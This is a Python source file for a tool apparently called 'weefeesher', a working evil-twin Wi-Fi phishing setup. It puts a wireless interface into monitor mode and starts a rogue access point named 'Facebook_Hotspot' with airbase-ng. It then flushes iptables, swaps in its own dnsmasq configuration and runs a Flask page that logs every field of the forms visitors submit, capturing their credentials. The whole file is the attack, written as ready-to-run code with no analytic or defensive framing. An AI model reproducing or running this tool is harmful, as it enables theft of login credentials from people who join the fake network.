#!/usr/bin/env python

import subprocess
import sys
import time
import signal
import os

from weefeesher.utils.output import Logger
from flask import Flask,flash,render_template,request

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

here = os.path.dirname(os.path.abspath(__file__))

def save_iptables():
    subprocess.call('iptables-save > /tmp/weefeesher.iptables.state', shell=True)

def flush_iptables():
    subprocess.call('iptables -F', shell=True)
    subprocess.call('iptables -X', shell=True)

def restore_iptables():
    subprocess.call('iptables-restore < /tmp/weefeesher.iptables.state', shell=True)
    subprocess.call('rm -f /tmp/weefeesher.iptables.state', shell=True)

class Web():

    def __init__(self):
        self.app =  Flask(__name__)

    def run(self):
        @self.app.route('/', methods = ['GET', 'POST'])
        def index():
            if request.method == 'POST':
                data = request.form
                for key in data.keys():
                    for value in data.getlist(key):
                        Logger.userinfo("%s : %s" % (key, value))
            return render_template('index.html')

        self.app.run('192.168.10.1',80)

class Dnsmasq():

    def __init__(self):
        pass

    def backup(self):
        subprocess.call('[[ -f /etc/dnsmasq.conf ]] && mv /etc/dnsmasq.conf /tmp/weefeesher.dnsmasq.conf', shell=True)

    def deploy(self):
        subprocess.call('cp %s/conf/dnsmasq.conf /etc/dnsmasq.conf' % here, shell=True)
        subprocess.call('killall -9 dnsmasq &> /dev/null; dnsmasq', shell=True)

    def restore(self):
    	Logger.info('Restoring dnsmasq base config file')
        subprocess.call('[[ -f /tmp/weefeesher.dnsmasq.conf ]] && mv /tmp/weefeesher.dnsmasq.conf /etc/dnsmasq.conf', shell=True)

    def kill(self):
    	Logger.info('Killing dnsmasq instance')
        subprocess.call('killall -9 dnsmasq &> /dev/null', shell=True)

def check_requirements():

    user = subprocess.check_output('whoami', shell=True)[:-1]
    if user != 'root':
        Logger.error("Please launch this program as root")
        sys.exit(0)
    dnsmasq = subprocess.call('which dnsmasq &> /dev/null', shell=True)
    if dnsmasq:
        Logger.error("Please install dnsmasq")
        sys.exit(0)
    airbase = subprocess.call('which airbase-ng &> /dev/null', shell=True)
    if airbase:
        Logger.error("Please install aircrack suite, especially airbase-ng")
        sys.exit(0)

def signal_handler(signal, frame):
    global phishing_iface
    global dns
    Logger.info('Shutting down rogue AP')
    subprocess.call('pkill -9 airbase-ng', shell=True)
    Logger.info('Deleting monitoring interface')
    subprocess.call('airmon-ng stop mon0 &> /dev/null', shell=True)
    Logger.info('Up wireless interface')
    subprocess.call('ip link set %s up' % phishing_iface, shell=True)
    subprocess.call('ip link set %s up' % phishing_iface, shell=True)
    subprocess.call('ip link set %s up' % phishing_iface, shell=True)
    Logger.info('Restoring iptables rules')
    restore_iptables()
    dns.kill()
    dns.restore()
    Logger.info('Bye !')
    sys.exit(0)

def launch_ap(iface):
    Logger.info('Shutting down phishing interface %s' % iface)
    subprocess.call('ip link set %s down' % iface, shell=True)
    subprocess.call('ip link set %s down' % iface, shell=True)
    subprocess.call('ip link set %s down' % iface, shell=True)
    subprocess.call('iw %s set type monitor' % iface, shell=True)
    subprocess.call('iw %s set type monitor' % iface, shell=True)
    subprocess.call('iw %s set type monitor' % iface, shell=True)
    subprocess.call('ip link set %s up' % iface, shell=True)
    subprocess.call('ip link set %s up' % iface, shell=True)
    subprocess.call('ip link set %s up' % iface, shell=True)
    Logger.info('Launching rogue access point...')
    subprocess.Popen('airbase-ng --essid "Facebook_Hotspot" -I 60 %s &> /dev/null' % iface, shell=True)
    time.sleep(2)
    subprocess.call('ip addr add 192.168.10.1/24 dev at0', shell=True)


def main():
    check_requirements()
    if len(sys.argv) < 3:
        print 'Usage : %s <phishing interface> <internet interface>' % sys.argv[0]
        sys.exit(0)
    global phishing_iface
    phishing_iface = sys.argv[1]
    global internet_iface
    internet_iface = sys.argv[2]
    signal.signal(signal.SIGINT, signal_handler)
    save_iptables()
    flush_iptables()
    global dns
    dns = Dnsmasq()
    dns.backup()
    launch_ap(phishing_iface)
    dns.deploy()
    web = Web()
    web.run()
    while True:
        pass
